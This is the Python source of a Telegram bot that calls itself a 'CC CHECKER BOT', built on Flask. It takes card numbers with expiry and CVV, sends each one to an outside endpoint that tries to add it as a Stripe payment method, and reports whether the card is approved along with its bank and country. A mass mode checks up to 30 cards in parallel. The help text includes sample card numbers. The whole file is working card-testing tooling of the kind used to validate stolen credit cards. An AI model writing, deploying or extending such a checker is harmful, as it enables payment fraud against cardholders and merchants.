import os
import re
import json
import tempfile
import threading
import concurrent.futures
from flask import Flask, request, jsonify
import requests
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Telegram Bot Token - set this in Render environment variables
TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
API_URL = "https://andul-1.onrender.com/add_payment_method/sogaged371@hudisk.com/sogaged371@/"

# Create Flask app
app = Flask(__name__)

# Thread pool for parallel processing
executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

def validate_card(card_input):
    """Validate and format card details"""
    try:
        card_input = card_input.strip()
        
        if '|' not in card_input:
            return None, "❌ Invalid format"
        
        parts = card_input.split('|')
        if len(parts) != 4:
            return None, "❌ Invalid format"
        
        card, month, year, cvv = [p.strip() for p in parts]
        
        # Clean card number
        card = re.sub(r'\D', '', card)
        
        # Validate card number
        if not (13 <= len(card) <= 19):
            return None, "❌ Invalid card length"
        
        # Validate month
        if not month.isdigit() or not (1 <= int(month) <= 12):
            return None, "❌ Invalid month"
        
        # Convert year to 2-digit
        if len(year) == 4:
            year = year[2:]
        elif len(year) != 2:
            return None, "❌ Invalid year"
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return None, "❌ Invalid CVV"
        
        # Final format
        formatted = f"{card}|{month}|{year}|{cvv}"
        return formatted, None
        
    except Exception as e:
        logger.error(f"Validation error: {e}")
        return None, "❌ Validation error"

def check_card(card_input):
    """Check single card"""
    # Validate card first
    formatted_card, error = validate_card(card_input)
    if error:
        return card_input, error
    
    # Prepare URL
    url_encoded = formatted_card.replace('|', '%7C')
    full_url = f"{API_URL}{url_encoded}"
    
    try:
        response = requests.get(full_url, timeout=20)
        
        if response.status_code == 200:
            result = parse_response(formatted_card, response.text)
            return card_input, result
        else:
            return card_input, f"❌ API Error: Status {response.status_code}"
            
    except requests.exceptions.Timeout:
        return card_input, "❌ Request timeout"
    except Exception as e:
        logger.error(f"Request error: {e}")
        return card_input, "❌ Connection error"

def parse_response(card_info, response_text):
    """Parse API response and format output"""
    try:
        card_parts = card_info.split('|')
        card_number = card_parts[0]
        
        # Get BIN
        bin_info = card_number[:6]
        
        # Determine brand
        if card_number.startswith('4'):
            brand = "Visa"
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            brand = "Mastercard"
        elif card_number.startswith(('34', '37')):
            brand = "American Express"
        else:
            brand = "Unknown"
        
        # Default values
        status = "DECLINED ❌"
        status_msg = "Card declined"
        gateway = "STRIPE AUTH"
        bank = "UNKNOWN BANK"
        country = "UNKNOWN"
        
        # Parse response text line by line
        lines = response_text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Check for status
            if 'STATUS :' in line:
                status_value = line.split('STATUS :')[-1].strip()
                if 'APPROVED' in status_value.upper():
                    status = "APPROVED ✅"
                    status_msg = "Card approved"
                elif 'DECLINED' in status_value.upper():
                    status = "DECLINED ❌"
                    status_msg = "Card declined"
            
            # Check for response
            elif 'RESPONSE :' in line:
                status_msg = line.split('RESPONSE :')[-1].strip()
            
            # Check for bank
            elif 'BANK :' in line:
                bank = line.split('BANK :')[-1].strip()
            
            # Check for country
            elif 'COUNTRY :' in line:
                country = line.split('COUNTRY :')[-1].strip()
        
        # Format result
        result = f"""- CARD : {card_info}
- STATUS : {status}
- RESPONSE : {status_msg}
- GATEWAY : {gateway}
- BIN Info : {bin_info}
- Brand : {brand}
- TYPE : Credit
- BANK : {bank}
- COUNTRY : {country}"""
        
        return result
        
    except Exception as e:
        logger.error(f"Parse error: {e}")
        return f"""- CARD : {card_info}
- STATUS : ERROR ❌
- RESPONSE : Parse error
- GATEWAY : STRIPE AUTH
- BIN Info : ERROR
- Brand : Unknown
- TYPE : Credit
- BANK : ERROR
- COUNTRY : ERROR"""

def send_telegram_message(chat_id, text, parse_mode=None):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        logger.error(f"Failed to send message: {e}")
        return None

def send_telegram_action(chat_id, action="typing"):
    """Send typing action"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendChatAction"
    payload = {
        'chat_id': chat_id,
        'action': action
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def process_command(update):
    """Process Telegram command"""
    chat_id = update['message']['chat']['id']
    text = update['message'].get('text', '').strip()
    
    # Handle /start command
    if text == '/start':
        welcome_text = """💳 *CC CHECKER BOT*

*Commands:*
/chk - Check single card
/mass - Check multiple cards FAST
/file - Upload .txt file
/help - Show detailed help

*Format:* CARD|MM|YY|CVV
*Example:* 5220940191435288|06|27|404"""
        
        send_telegram_message(chat_id, welcome_text, "Markdown")
    
    # Handle /help command
    elif text == '/help':
        help_text = """📚 *CC CHECKER BOT HELP*

*Commands:*
/start - Show commands
/help - Show this help
/chk - Check single card
/mass - Check multiple cards FAST (1-30)
/file - Upload .txt file with cards

*Card Format:*
CARD_NUMBER|MM|YYYY|CVV

*Examples:*/chk 5220940191435288|06|2027|404
/mass
4232231106894283|06|26|241
        
        send_telegram_message(chat_id, help_text, "Markdown")
    
    # Handle /chk command
    elif text.startswith('/chk '):
        card_input = text[5:].strip()
        if not card_input:
            send_telegram_message(chat_id, "❌ Usage: /chk CARD|MM|YYYY|CVV\n\nExample: /chk 5220940191435288|06|2027|404")
            return
        
        send_telegram_action(chat_id, "typing")
        _, result = check_card(card_input)
        send_telegram_message(chat_id, result)
    
    # Handle /mass command start
    elif text == '/mass':
        mass_text = """⚡ *ULTRA-FAST MASS CHECK*

Send up to 30 cards (one per line):
4232231106894283|06|26|241
4116670005727071|02|26|426

Type /cancel to stop."""
        
        send_telegram_message(chat_id, mass_text, "Markdown")
    
    # Handle mass check input (multiple lines)
    elif '|' in text and '\n' in text:
        # This is a mass check with multiple cards
        lines = text.split('\n')
        cards = [line.strip() for line in lines if line.strip()]
        
        if len(cards) > 30:
            send_telegram_message(chat_id, f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
            cards = cards[:30]
        
        # Process in parallel using thread pool
        send_telegram_action(chat_id, "typing")
        send_telegram_message(chat_id, f"⚡ Processing {len(cards)} cards in parallel...\n⏱️ Estimated: 1-2 minutes")
        
        # Submit all tasks
        futures = []
        for card in cards:
            future = executor.submit(check_card, card)
            futures.append(future)
        
        # Collect results as they complete
        completed = 0
        for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
            card_input, result = future.result()
            send_telegram_message(chat_id, f"Card {i}:\n{result}\n{'='*40}")
            completed += 1
        
        send_telegram_message(chat_id, f"✅ Mass check complete!\nProcessed: {completed}/{len(cards)} cards")
    
    # Handle single card input (without command)
    elif '|' in text and text.count('|') == 3:
        send_telegram_action(chat_id, "typing")
        _, result = check_card(text)
        send_telegram_message(chat_id, result)
    
    # Handle unknown command
    elif text.startswith('/'):
        send_telegram_message(chat_id, "❌ Unknown command. Use /start to see available commands.")

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    try:
        update = request.json
        
        # Log the update
        logger.info(f"Received update: {update}")
        
        # Process the update in a separate thread to avoid blocking
        threading.Thread(target=process_command, args=(update,)).start()
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    """Set Telegram webhook"""
    try:
        webhook_url = f"{request.host_url}webhook"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook"
        payload = {'url': webhook_url}
        response = requests.post(url, json=payload)
        
        if response.status_code == 200:
            return f"✅ Webhook set to: {webhook_url}"
        else:
            return f"❌ Failed to set webhook: {response.text}"
    except Exception as e:
        return f"❌ Error: {e}"

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy'}), 200

@app.route('/')
def home():
    """Home page"""
    return "🤖 CC Checker Bot is running! Use /setwebhook to configure Telegram webhook."

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
